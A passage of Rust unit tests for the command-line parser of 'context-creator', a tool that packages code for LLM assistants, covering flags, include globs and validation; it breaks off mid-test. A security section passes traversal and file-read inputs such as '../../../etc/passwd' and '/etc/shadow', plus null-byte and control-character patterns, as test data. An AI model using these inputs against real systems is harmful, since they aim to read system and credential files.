    assert_eq!(config.llm_tool, LlmTool::Gemini);
}

#[test]
fn test_llm_tool_gemini() {
    let config = Config::parse_from(["context-creator", "--tool", "gemini", "."]);
    assert_eq!(config.llm_tool, LlmTool::Gemini);
}

#[test]
fn test_llm_tool_codex() {
    let config = Config::parse_from(["context-creator", "--tool", "codex", "."]);
    assert_eq!(config.llm_tool, LlmTool::Codex);
}

#[test]
fn test_llm_tool_short_flag() {
    let config = Config::parse_from(["context-creator", "-t", "codex", "."]);
    assert_eq!(config.llm_tool, LlmTool::Codex);
}

#[test]
fn test_llm_tool_command_names() {
    assert_eq!(LlmTool::Gemini.command(), "gemini");
    assert_eq!(LlmTool::Codex.command(), "codex");
}

#[test]
fn test_llm_tool_install_instructions() {
    assert!(LlmTool::Gemini
        .install_instructions()
        .contains("pip install"));
    assert!(LlmTool::Codex.install_instructions().contains("github.com"));
}

#[test]
fn test_repo_argument() {
    let config = Config::parse_from(["context-creator", "--repo", "https://github.com/owner/repo"]);
    assert_eq!(
        config.repo,
        Some("https://github.com/owner/repo".to_string())
    );
}

#[test]
fn test_repo_and_directory_now_disallowed() {
    // This combination is now disallowed to prevent silent overwriting bug
    let config = Config::parse_from([
        "context-creator",
        "--repo",
        "https://github.com/owner/repo",
        ".",
    ]);

    assert_eq!(
        config.repo,
        Some("https://github.com/owner/repo".to_string())
    );
    assert_eq!(config.paths, Some(vec![PathBuf::from(".")]));

    // This should FAIL validation to prevent confusion where paths get silently ignored
    let result = config.validate();
    assert!(result.is_err());
    assert!(result
        .unwrap_err()
        .to_string()
        .contains("Cannot specify both --repo and local paths"));
}

#[test]
fn test_valid_repo_url_accepted() {
    let config = Config::parse_from([
        "context-creator",
        "--repo",
        "https://github.com/matiasvillaverde/context-creator",
    ]);
    assert_eq!(
        config.repo,
        Some("https://github.com/matiasvillaverde/context-creator".to_string())
    );
}

#[test]
fn test_prompt_flag_with_spaces() {
    let config = Config::parse_from([
        "context-creator",
        "--prompt",
        "How does authentication work in this codebase?",
    ]);
    assert_eq!(
        config.get_prompt(),
        Some("How does authentication work in this codebase?".to_string())
    );
    assert_eq!(config.get_directories(), vec![PathBuf::from(".")]);
}

#[test]
fn test_prompt_short_flag() {
    let config = Config::parse_from(["context-creator", "-p", "Analyze security"]);
    assert_eq!(config.get_prompt(), Some("Analyze security".to_string()));
}

#[test]
fn test_positional_directories() {
    let config = Config::parse_from(["context-creator", "src/auth", "src/models", "tests/auth"]);
    assert_eq!(
        config.get_directories(),
        vec![
            PathBuf::from("src/auth"),
            PathBuf::from("src/models"),
            PathBuf::from("tests/auth")
        ]
    );
}

#[test]
fn test_multiple_directories() {
    let config = Config::parse_from(["context-creator", "src/core", "src/utils", "tests"]);
    assert_eq!(
        config.get_directories(),
        vec![
            PathBuf::from("src/core"),
            PathBuf::from("src/utils"),
            PathBuf::from("tests")
        ]
    );
}

#[test]
fn test_prompt_and_paths_now_allowed() {
    // This combination is now allowed per issue #34
    let config = Config::parse_from(["context-creator", "--prompt", "test", "src"]);

    assert_eq!(config.get_prompt(), Some("test".to_string()));
    assert_eq!(config.paths, Some(vec![PathBuf::from("src")]));

    // This should pass validation with the new flexible combinations
    assert!(config.validate().is_ok());
}

#[test]
fn test_stdin_flag() {
    // Test with explicit stdin flag
    let config = Config::parse_from(["context-creator", "--stdin"]);
    assert!(config.read_stdin);
    assert!(config.should_read_stdin());

    // Test without stdin flag
    let config = Config::parse_from(["context-creator", "src"]);
    assert!(!config.read_stdin);
}

#[test]
fn test_copy_flag() {
    let config = Config::parse_from(["context-creator", "src", "--copy"]);
    assert!(config.copy);
}

#[test]
fn test_copy_short_flag() {
    let config = Config::parse_from(["context-creator", "src", "-C"]);
    assert!(config.copy);
}

#[test]
fn test_copy_default_false() {
    let config = Config::parse_from(["context-creator", "src"]);
    assert!(!config.copy);
}

#[test]
fn test_copy_with_output_conflict() {
    use tempfile::TempDir;
    let temp_dir = TempDir::new().unwrap();
    let config = Config::parse_from([
        "context-creator",
        temp_dir.path().to_str().unwrap(),
        "--copy",
        "-o",
        "out.md",
    ]);
    let result = config.validate();
    assert!(result.is_err());
    assert!(result
        .unwrap_err()
        .to_string()
        .contains("Cannot specify both --copy and --output"));
}

#[test]
fn test_enhanced_context_flag() {
    let config = Config::parse_from(["context-creator", "--enhanced-context", "."]);
    assert!(config.enhanced_context);
}

#[test]
fn test_enhanced_context_default_false() {
    let config = Config::parse_from(["context-creator", "."]);
    assert!(!config.enhanced_context);
}

// Tests for --include flag functionality
#[test]
fn test_include_single_path() {
    let config = Config::parse_from(["context-creator", "--include", "src/"]);
    // When using include patterns, base directory is current dir
    assert_eq!(config.get_directories(), vec![PathBuf::from(".")]);
    // The patterns themselves are accessed via get_include_patterns
    assert_eq!(config.get_include_patterns(), vec!["src/"]);
}

#[test]
fn test_include_multiple_paths() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "src/",
        "--include",
        "tests/",
    ]);
    // When using include patterns, base directory is current dir
    assert_eq!(config.get_directories(), vec![PathBuf::from(".")]);
    // The patterns themselves are accessed via get_include_patterns
    assert_eq!(config.get_include_patterns(), vec!["src/", "tests/"]);
}

#[test]
fn test_include_three_paths() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "src/",
        "--include",
        "tests/",
        "--include",
        "docs/",
    ]);
    // When using include patterns, base directory is current dir
    assert_eq!(config.get_directories(), vec![PathBuf::from(".")]);
    // The patterns themselves are accessed via get_include_patterns
    assert_eq!(
        config.get_include_patterns(),
        vec!["src/", "tests/", "docs/"]
    );
}

#[test]
fn test_positional_and_include_now_allowed() {
    // This combination is now allowed per issue #34
    let config = Config::parse_from(["context-creator", "src/", "--include", "tests/"]);

    assert_eq!(config.paths, Some(vec![PathBuf::from("src/")]));
    assert_eq!(config.get_include_patterns(), vec!["tests/"]);

    // This should pass validation with the new flexible combinations
    assert!(config.validate().is_ok());
}

#[test]
fn test_include_with_prompt_success() {
    // This should now work - prompt and include can be used together
    let result =
        Config::try_parse_from(["context-creator", "--prompt", "test", "--include", "src/"]);
    assert!(result.is_ok());
    let config = result.unwrap();
    assert_eq!(config.get_prompt(), Some("test".to_string()));
    assert_eq!(config.get_include_patterns(), vec!["src/"]);
}

#[test]
fn test_include_with_repo_now_allowed() {
    // This combination is now allowed per issue #34
    let config = Config::parse_from([
        "context-creator",
        "--repo",
        "https://github.com/owner/repo",
        "--include",
        "src/",
    ]);

    assert_eq!(
        config.repo,
        Some("https://github.com/owner/repo".to_string())
    );
    assert_eq!(config.get_include_patterns(), vec!["src/"]);

    // This should pass validation with the new flexible combinations
    assert!(config.validate().is_ok());
}

#[test]
fn test_include_with_stdin_now_allowed() {
    // This combination is now allowed per issue #34
    let config = Config::parse_from(["context-creator", "--stdin", "--include", "src/"]);

    assert!(config.read_stdin);
    assert_eq!(config.get_include_patterns(), vec!["src/"]);

    // This should pass validation with the new flexible combinations
    assert!(config.validate().is_ok());
}

#[test]
fn test_no_arguments_defaults_to_current_directory() {
    // This test ensures that when no paths or include flags are provided,
    // we default to current directory "."
    let config = Config::parse_from(["context-creator", "--prompt", "test"]);
    // Note: This is testing that the default behavior is preserved
    assert_eq!(config.get_directories(), vec![PathBuf::from(".")]);
}

#[test]
fn test_positional_with_file_path_validation_error() {
    use std::fs;
    use tempfile::TempDir;

    let temp_dir = TempDir::new().unwrap();
    let file_path = temp_dir.path().join("test_file.txt");
    fs::write(&file_path, "test content").unwrap();

    let config = Config::parse_from([
        "context-creator",
        file_path.to_str().unwrap(),
        "--output-file",
        "test.md",
    ]);

    // Should fail validation because positional path points to a file, not directory
    let result = config.validate();
    assert!(result.is_err());
    assert!(result
        .unwrap_err()
        .to_string()
        .contains("Path is not a directory"));
}

#[test]
fn test_include_with_file_path_validation_success() {
    use std::fs;
    use tempfile::TempDir;

    let temp_dir = TempDir::new().unwrap();
    let dir_path = temp_dir.path().join("test_dir");
    fs::create_dir(&dir_path).unwrap();

    let config = Config::parse_from([
        "context-creator",
        "--include",
        dir_path.to_str().unwrap(),
        "--output-file",
        "test.md",
    ]);

    // Should succeed validation because include path points to a directory
    let result = config.validate();
    assert!(result.is_ok());
}

#[test]
fn test_include_pattern_validation_valid_patterns() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "*.py",
        "--include",
        "**/*.rs",
        "--include",
        "src/**/*.js",
        "--output-file",
        "test.md",
    ]);

    // Should succeed validation for valid glob patterns
    let result = config.validate();
    assert!(result.is_ok());
}

#[test]
fn test_include_empty_pattern() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "",
        "--include",
        "*.py",
        "--output-file",
        "test.md",
    ]);

    // Should succeed validation - empty patterns are skipped
    let result = config.validate();
    assert!(result.is_ok());
}

#[test]
fn test_include_whitespace_only_pattern() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "   ",
        "--include",
        "*.py",
        "--output-file",
        "test.md",
    ]);

    // Should succeed validation - whitespace-only patterns are skipped
    let result = config.validate();
    assert!(result.is_ok());
}

#[test]
fn test_include_glob_pattern_simple_wildcard() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "*.py",
        "--output-file",
        "test.md",
    ]);

    // Should succeed validation for simple wildcard pattern
    let result = config.validate();
    assert!(result.is_ok());
}

#[test]
fn test_include_glob_pattern_recursive_directory() {
    // Test recursive directory matching
    let config = Config::parse_from(["context-creator", "--include", "**/*.rs"]);
    assert_eq!(config.include, Some(vec!["**/*.rs".to_string()]));
}

#[test]
fn test_include_glob_pattern_brace_expansion() {
    // Test brace expansion
    let config = Config::parse_from(["context-creator", "--include", "src/**/*.{py,js}"]);
    assert_eq!(config.include, Some(vec!["src/**/*.{py,js}".to_string()]));
}

#[test]
fn test_include_glob_pattern_character_sets() {
    // Test character sets and ranges
    let config = Config::parse_from(["context-creator", "--include", "**/test[0-9].py"]);
    assert_eq!(config.include, Some(vec!["**/test[0-9].py".to_string()]));
}

#[test]
fn test_include_multiple_glob_patterns() {
    // Test multiple glob patterns
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "**/*repository*.py",
        "--include",
        "**/db/**",
    ]);
    assert_eq!(
        config.include,
        Some(vec![
            "**/*repository*.py".to_string(),
            "**/db/**".to_string()
        ])
    );
}

#[test]
fn test_include_complex_pattern_combinations() {
    // Test complex pattern combinations
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "**/*{repository,service,model}*.py",
        "--include",
        "**/db/**",
    ]);
    assert_eq!(
        config.include,
        Some(vec![
            "**/*{repository,service,model}*.py".to_string(),
            "**/db/**".to_string()
        ])
    );
}

#[test]
fn test_include_pattern_validation_invalid_pattern() {
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "src/[", // Invalid unclosed bracket
        "--output-file",
        "test.md",
    ]);

    // CLI validation now passes - pattern validation happens in walker.rs for better security
    let result = config.validate();
    assert!(
        result.is_ok(),
        "CLI validation should pass, walker handles pattern validation"
    );
}

// === SECURITY INTEGRATION TESTS ===

#[test]
fn test_cli_security_directory_traversal_rejected() {
    // Test that directory traversal patterns are rejected during file processing
    use std::fs;
    use tempfile::TempDir;

    let temp_dir = TempDir::new().unwrap();
    let current_dir = std::env::current_dir().unwrap();
    std::env::set_current_dir(temp_dir.path()).unwrap();

    // Create a test file
    fs::write("test.py", "print('hello')").unwrap();

    let config = Config::parse_from([
        "context-creator",
        "--include",
        "../../../etc/passwd", // Directory traversal attempt
        "--output-file",
        "output.md",
    ]);

    // CLI validation should pass (we moved validation to walker)
    assert!(config.validate().is_ok());

    // But actual execution should fail during file processing
    let result = std::panic::catch_unwind(|| {
        // This would normally trigger the walker code path
        // Since we can't easily test the full CLI execution here,
        // we verify the config is parsed correctly
        let patterns = config.get_include_patterns();
        assert_eq!(patterns, vec!["../../../etc/passwd"]);
    });

    std::env::set_current_dir(current_dir).unwrap();
    assert!(
        result.is_ok(),
        "Config parsing should succeed, validation happens later"
    );
}

#[test]
fn test_cli_security_null_byte_patterns() {
    // Test that patterns with null bytes are handled gracefully
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "test\0.py", // Null byte in pattern
        "--output-file",
        "output.md",
    ]);

    // CLI validation should pass - security validation happens in walker
    let result = config.validate();
    assert!(result.is_ok(), "CLI should parse null byte patterns");

    let patterns = config.get_include_patterns();
    assert_eq!(patterns, vec!["test\0.py"]);
}

#[test]
fn test_cli_security_long_pattern_handling() {
    // Test very long patterns to check for buffer overflow vulnerabilities
    let long_pattern = "a".repeat(2000); // Longer than our 1000 char limit

    let config = Config::parse_from([
        "context-creator",
        "--include",
        &long_pattern,
        "--output-file",
        "output.md",
    ]);

    // CLI should handle long patterns gracefully
    let result = config.validate();
    assert!(result.is_ok(), "CLI should handle long patterns");

    let patterns = config.get_include_patterns();
    assert_eq!(patterns, vec![long_pattern]);
}

#[test]
fn test_cli_security_multiple_suspicious_patterns() {
    // Test multiple potentially dangerous patterns
    let config = Config::parse_from([
        "context-creator",
        "--include",
        "../../../etc/passwd",
        "--include",
        "/etc/shadow",
        "--include",
        "..\\..\\Windows\\System32\\*",
        "--include",
        "test\0file.py",
        "--output-file",
        "output.md",
    ]);

    // CLI validation should pass
    assert!(config.validate().is_ok());

    let patterns = config.get_include_patterns();
    assert_eq!(
        patterns,
        vec![
            "../../../etc/passwd",
            "/etc/shadow",
            "..\\..\\Windows\\System32\\*",
            "test\0file.py"
        ]
    );
}

#[test]
fn test_cli_security_control_character_patterns() {
    // Test patterns with various control characters
    let patterns_with_controls = vec![
        "file\x01.py",   // SOH
        "test\x08.txt",  // Backspace
        "dir\x0c/*.rs",  // Form feed
        "file\nname.py", // Newline
        "tab\tfile.rs",  // Tab
    ];

    for pattern in patterns_with_controls {
        let config = Config::parse_from([
            "context-creator",
            "--include",
            pattern,
            "--output-file",
            "output.md",
        ]);

        // CLI should parse these patterns
        assert!(
            config.validate().is_ok(),
            "CLI should parse pattern with control chars: {pattern:?}"
        );

        let parsed_patterns = config.get_include_patterns();
        assert_eq!(parsed_patterns, vec![pattern]);
    }
}
```

## tests/cli_uncovered_scenarios_test.rs

Imports: clap::Parser, context_creator::cli::Config, std::path::PathBuf, tempfile::TempDir, config

Type references: clap::Parser.Parser, context_creator::cli::Config.Config, std::path::PathBuf.PathBuf, tempfile::TempDir.TempDir

```rust
use clap::Parser;
use context_creator::cli::Config;
use std::path::PathBuf;
use tempfile::TempDir;

// TESTS FOR 10 UNCOVERED CRITICAL SCENARIOS
// These tests cover practical usage patterns, edge cases, and user experience aspects
// that are essential for a production-ready CLI tool

// Helper function to indicate expected failure during ArgGroup restriction phase
fn expect_arggroup_failure() {
    // This is a placeholder for expected failures due to ArgGroup restrictions
    // When the restrictions are removed, these will become successful test cases
}

#[test]
fn test_config_file_integration_with_flexible_combinations() {
    // Scenario 1: Config file defaults with flexible combinations
    // This tests how config file settings interact with new flexible combos

    // Create a temporary config file
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join("test.toml");
    let config_content = r#"
[defaults]
max_tokens = 100000
verbose = true
progress = true

[tokens]
gemini = 500000
codex = 400000

ignore = ["target/**", "node_modules/**"]
include = ["src/**/*.rs"]
"#;
    std::fs::write(&config_path, config_content).unwrap();

    // Test config file with prompt + paths combination
    // NOTE: Currently fails validation due to prompt + paths restriction
    let result = Config::try_parse_from([
        "context-creator",
        "--prompt",
        "Test with config",
        "--config",
        config_path.to_str().unwrap(),
        "src/",
        "tests/",
    ]);

    match result {
        Ok(config) => {
            assert_eq!(config.get_prompt(), Some("Test with config".to_string()));
            assert_eq!(
                config.paths,
                Some(vec![PathBuf::from("src/"), PathBuf::from("tests/")])
            );
            assert_eq!(config.config, Some(config_path.clone()));
            // Will pass validation after we fix restrictions
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }

    // Test config file with just prompt (should work)
    let config2 = Config::parse_from([
        "context-creator",
        "--prompt",
        "Test config only",
        "--config",
        config_path.to_str().unwrap(),
    ]);

    assert_eq!(config2.get_prompt(), Some("Test config only".to_string()));
    assert_eq!(config2.config, Some(config_path));

    // This should pass validation
    assert!(config2.validate().is_ok());
}

#[test]
fn test_stdin_detection_with_flexible_combinations() {
    // Scenario 2: Automatic stdin detection with paths (no explicit --stdin)
    // This tests the should_read_stdin() logic with new combinations

    // Test 1: With explicit --stdin and paths
    // NOTE: Currently fails at parsing due to ArgGroup restrictions
    let result1 = Config::try_parse_from(["context-creator", "--stdin", "src/", "tests/"]);

    // Should parse successfully after fixing ArgGroup restrictions
    if let Ok(config1) = result1 {
        assert!(config1.read_stdin);
        assert_eq!(
            config1.paths,
            Some(vec![PathBuf::from("src/"), PathBuf::from("tests/")])
        );
        // Will validate successfully after fixing restrictions
    } else {
        // Currently fails at parsing, which is expected
        assert!(result1.is_err());
    }

    // Test 2: Just paths without --stdin (should not auto-detect in tests)
    let config2 = Config::parse_from(["context-creator", "src/", "tests/"]);

    assert!(!config2.read_stdin);
    assert_eq!(
        config2.paths,
        Some(vec![PathBuf::from("src/"), PathBuf::from("tests/")])
    );

    // This should pass validation (no conflicts)
    assert!(config2.validate().is_ok());
}

#[test]
fn test_copy_flag_with_flexible_combinations() {
    // Scenario 3: Copy to clipboard with flexible combinations
    // This tests --copy flag with new combinations

    // Test 1: Copy with prompt and paths
    // NOTE: Currently fails validation due to prompt + paths restriction
    let result1 = Config::try_parse_from([
        "context-creator",
        "--prompt",
        "Test copy",
        "--copy",
        "src/",
        "tests/",
    ]);

    match result1 {
        Ok(config1) => {
            assert_eq!(config1.get_prompt(), Some("Test copy".to_string()));
            assert!(config1.copy);
            assert_eq!(
                config1.paths,
                Some(vec![PathBuf::from("src/"), PathBuf::from("tests/")])
            );
            // Will pass validation after fixing restrictions
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }

    // Test 2: Copy with stdin and paths
    // NOTE: Currently fails at parsing due to ArgGroup restrictions
    let result2 = Config::try_parse_from(["context-creator", "--stdin", "--copy", "src/"]);

    match result2 {
        Ok(config2) => {
            assert!(config2.read_stdin);
            assert!(config2.copy);
            assert_eq!(config2.paths, Some(vec![PathBuf::from("src/")]));
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }

    // Test 3: Copy with repo and prompt
    // NOTE: Currently fails validation due to prompt + repo restriction
    let result3 = Config::try_parse_from([
        "context-creator",
        "--prompt",
        "Test repo copy",
        "--copy",
        "--repo",
        "https://github.com/owner/repo",
    ]);

    match result3 {
        Ok(config3) => {
            assert_eq!(config3.get_prompt(), Some("Test repo copy".to_string()));
            assert!(config3.copy);
            assert_eq!(
                config3.repo,
                Some("https://github.com/owner/repo".to_string())
            );
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }
}

#[test]
fn test_tool_selection_with_flexible_combinations() {
    // Scenario 4: Different LLM tools with flexible combinations
    // This tests --tool flag with new combinations

    // Test 1: Codex with prompt and paths
    // NOTE: Currently fails validation due to prompt + paths restriction
    let result1 = Config::try_parse_from([
        "context-creator",
        "--prompt",
        "Test codex",
        "--tool",
        "codex",
        "src/",
        "tests/",
    ]);

    match result1 {
        Ok(config1) => {
            assert_eq!(config1.get_prompt(), Some("Test codex".to_string()));
            assert_eq!(config1.llm_tool.command(), "codex");
            assert_eq!(
                config1.paths,
                Some(vec![PathBuf::from("src/"), PathBuf::from("tests/")])
            );
            // Will pass validation after fixing restrictions
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }

    // Test 2: Gemini with stdin and repo
    // NOTE: Currently fails at parsing due to ArgGroup restrictions
    let result2 = Config::try_parse_from([
        "context-creator",
        "--stdin",
        "--tool",
        "gemini",
        "--repo",
        "https://github.com/owner/repo",
    ]);

    match result2 {
        Ok(config2) => {
            assert!(config2.read_stdin);
            assert_eq!(config2.llm_tool.command(), "gemini");
            assert_eq!(
                config2.repo,
                Some("https://github.com/owner/repo".to_string())
            );
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }

    // Test 3: Tool with include patterns and prompt (this should work)
    let config3 = Config::parse_from([
        "context-creator",
        "--prompt",
        "Test tool patterns",
        "--tool",
        "codex",
        "--include",
        "**/*.rs",
        "--ignore",
        "target/**",
    ]);

    assert_eq!(config3.get_prompt(), Some("Test tool patterns".to_string()));
    assert_eq!(config3.llm_tool.command(), "codex");
    assert_eq!(config3.get_include_patterns(), vec!["**/*.rs"]);
    assert_eq!(config3.get_ignore_patterns(), vec!["target/**"]);

    // This should pass validation (prompt + include patterns work)
    assert!(config3.validate().is_ok());
}

#[test]
fn test_token_limits_with_flexible_combinations() {
    // Scenario 5: Max tokens with flexible combinations
    // This tests token calculation with new input sources

    // Test 1: Max tokens with prompt and paths
    // NOTE: Currently fails validation due to prompt + paths restriction
    let result1 = Config::try_parse_from([
        "context-creator",
        "--prompt",
        "Test token limits",
        "--max-tokens",
        "500000",
        "src/",
        "tests/",
    ]);

    match result1 {
        Ok(config1) => {
            assert_eq!(config1.get_prompt(), Some("Test token limits".to_string()));
            assert_eq!(config1.max_tokens, Some(500000));
            assert_eq!(
                config1.paths,
                Some(vec![PathBuf::from("src/"), PathBuf::from("tests/")])
            );
            assert_eq!(config1.get_effective_max_tokens(), Some(500000));
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }

    // Test 2: Max tokens with stdin and paths
    // NOTE: Currently fails at parsing due to ArgGroup restrictions
    let result2 = Config::try_parse_from([
        "context-creator",
        "--stdin",
        "--max-tokens",
        "200000",
        "src/",
    ]);

    match result2 {
        Ok(config2) => {
            assert!(config2.read_stdin);
            assert_eq!(config2.max_tokens, Some(200000));
            assert_eq!(config2.paths, Some(vec![PathBuf::from("src/")]));
            assert_eq!(config2.get_effective_max_tokens(), Some(200000));
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }

    // Test 3: Max tokens with repo and prompt
    // NOTE: Currently fails validation due to prompt + repo restriction
    let result3 = Config::try_parse_from([
        "context-creator",
        "--prompt",
        "Test repo tokens",
        "--max-tokens",
        "1000000",
        "--repo",
        "https://github.com/owner/repo",
    ]);

    match result3 {
        Ok(config3) => {
            assert_eq!(config3.get_prompt(), Some("Test repo tokens".to_string()));
            assert_eq!(config3.max_tokens, Some(1000000));
            assert_eq!(
                config3.repo,
                Some("https://github.com/owner/repo".to_string())
            );
            assert_eq!(config3.get_effective_max_tokens(), Some(1000000));
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }
}

#[test]
fn test_quiet_verbose_flags_with_flexible_combinations() {
    // Scenario 6: Output control with flexible combinations
    // This tests logging flags with new combinations

    // Test 1: Quiet with prompt and paths
    // NOTE: Currently fails validation due to prompt + paths restriction
    let result1 = Config::try_parse_from([
        "context-creator",
        "--prompt",
        "Test quiet",
        "--quiet",
        "src/",
        "tests/",
    ]);

    match result1 {
        Ok(config1) => {
            assert_eq!(config1.get_prompt(), Some("Test quiet".to_string()));
            assert!(config1.quiet);
            assert_eq!(
                config1.paths,
                Some(vec![PathBuf::from("src/"), PathBuf::from("tests/")])
            );
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }

    // Test 2: Verbose with stdin and progress
    // NOTE: Currently fails at parsing due to ArgGroup restrictions
    let result2 = Config::try_parse_from([
        "context-creator",
        "--stdin",
        "--verbose",
        "--progress",
        "src/",
    ]);

    match result2 {
        Ok(config2) => {
            assert!(config2.read_stdin);
            assert!(config2.verbose);
            assert!(config2.progress);
            assert_eq!(config2.paths, Some(vec![PathBuf::from("src/")]));
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }

    // Test 3: Progress with repo and prompt
    // NOTE: Currently fails validation due to prompt + repo restriction
    let result3 = Config::try_parse_from([
        "context-creator",
        "--prompt",
        "Test progress",
        "--progress",
        "--repo",
        "https://github.com/owner/repo",
    ]);

    match result3 {
        Ok(config3) => {
            assert_eq!(config3.get_prompt(), Some("Test progress".to_string()));
            assert!(config3.progress);
            assert_eq!(
                config3.repo,
                Some("https://github.com/owner/repo".to_string())
            );
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }

    // Test 4: All flags together with include patterns (this should work)
    let config4 = Config::parse_from([
        "context-creator",
        "--prompt",
        "Test all flags",
        "--verbose",
        "--progress",
        "--include",
        "**/*.rs",
    ]);

    assert_eq!(config4.get_prompt(), Some("Test all flags".to_string()));
    assert!(config4.verbose);
    assert!(config4.progress);
    assert_eq!(config4.get_include_patterns(), vec!["**/*.rs"]);

    // This should pass validation (prompt + include patterns work)
    assert!(config4.validate().is_ok());
}

#[test]
fn test_multiple_repo_urls_edge_case() {
    // Scenario 7: Multiple repo arguments (should fail gracefully)
    // This tests multiple --repo flags behavior

    // Test 1: Try parsing multiple repo URLs (should fail at parse time)
    let result = Config::try_parse_from([
        "context-creator",
        "--repo",
        "https://github.com/owner/repo1",
        "--repo",
        "https://github.com/owner/repo2",
    ]);

    // Should fail at parsing (clap should prevent multiple values)
    assert!(result.is_err());

    // Test 2: Single repo with other options should work
    let config = Config::parse_from([
        "context-creator",
        "--repo",
        "https://github.com/owner/repo",
        "--max-tokens",
        "100000",
        "--verbose",
    ]);

    assert_eq!(
        config.repo,
        Some("https://github.com/owner/repo".to_string())
    );
    assert_eq!(config.max_tokens, Some(100000));
    assert!(config.verbose);

    // This should pass validation
    assert!(config.validate().is_ok());
}

#[test]
fn test_mixed_absolute_relative_paths() {
    // Scenario 8: Mixed path types with flexible combinations
    // This tests path resolution with mixed absolute/relative paths

    let temp_dir = TempDir::new().unwrap();
    let absolute_path = temp_dir.path().join("absolute");
    std::fs::create_dir(&absolute_path).unwrap();

    // Create relative directories for testing
    let _current_dir = std::env::current_dir().unwrap();

    // Test 1: Mixed paths with prompt (if directories exist)
    // NOTE: Currently fails validation due to prompt + paths restriction
    let result1 = Config::try_parse_from([
        "context-creator",
        "--prompt",
        "Test mixed paths",
        "src/",                          // Relative
        absolute_path.to_str().unwrap(), // Absolute
        "./tests",                       // Relative with ./
    ]);

    match result1 {
        Ok(config1) => {
            assert_eq!(config1.get_prompt(), Some("Test mixed paths".to_string()));
            assert_eq!(
                config1.paths,
                Some(vec![
                    PathBuf::from("src/"),
                    absolute_path.clone(),
                    PathBuf::from("./tests")
                ])
            );
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }

    // Test 2: Mixed paths with stdin
    // NOTE: Currently fails at parsing due to ArgGroup restrictions
    let result2 = Config::try_parse_from([
        "context-creator",
        "--stdin",
        "src/",
        absolute_path.to_str().unwrap(),
        "../context-creator", // Relative with ../
    ]);

    match result2 {
        Ok(config2) => {
            assert!(config2.read_stdin);
            assert_eq!(
                config2.paths,
                Some(vec![
                    PathBuf::from("src/"),
                    absolute_path.clone(),
                    PathBuf::from("../context-creator")
                ])
            );
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }

    // Test 3: Home directory expansion (tilde)
    // NOTE: Currently fails validation due to prompt + paths restriction
    let result3 = Config::try_parse_from([
        "context-creator",
        "--prompt",
        "Test home path",
        "src/",
        "~/Downloads", // This will be treated as literal, not expanded by the CLI
    ]);

    match result3 {
        Ok(config3) => {
            assert_eq!(config3.get_prompt(), Some("Test home path".to_string()));
            assert_eq!(
                config3.paths,
                Some(vec![PathBuf::from("src/"), PathBuf::from("~/Downloads")])
            );
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }

    // Parsing should work (validation will check if paths exist)
    // We test parsing, not validation since paths might not exist
    // Parsing succeeded if we got here
}

#[test]
fn test_special_characters_in_paths() {
    // Scenario 9: Special characters in paths
    // This tests path handling with special characters

    // Test 1: Paths with spaces
    // NOTE: Currently fails validation due to prompt + paths restriction
    let result1 = Config::try_parse_from([
        "context-creator",
        "--prompt",
        "Test spaces",
        "src with spaces/",
        "tests with spaces/",
    ]);

    match result1 {
        Ok(config1) => {
            assert_eq!(config1.get_prompt(), Some("Test spaces".to_string()));
            assert_eq!(
                config1.paths,
                Some(vec![
                    PathBuf::from("src with spaces/"),
                    PathBuf::from("tests with spaces/")
                ])
            );
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }

    // Test 2: Paths with dashes and underscores
    // NOTE: Currently fails at parsing due to ArgGroup restrictions
    let result2 = Config::try_parse_from([
        "context-creator",
        "--stdin",
        "src-with-dashes/",
        "src_with_underscores/",
        "src.with.dots/",
    ]);

    match result2 {
        Ok(config2) => {
            assert!(config2.read_stdin);
            assert_eq!(
                config2.paths,
                Some(vec![
                    PathBuf::from("src-with-dashes/"),
                    PathBuf::from("src_with_underscores/"),
                    PathBuf::from("src.with.dots/")
                ])
            );
        }
        Err(_) => {
            // Currently fails at parsing due to ArgGroup restrictions
            expect_arggroup_failure(); // Expected failure
        }
    }

    // Test 3: Paths with unicode characters
    // NOTE: Currently fails validation due to prompt + paths restriction
    let result3 = Config::try_parse_from([
        "context-creator",
        "--prompt",
        "Test unicode",
        "src/æµ‹è¯•/",
        "src/cafÃ©/",
        "src/ðŸš€/",
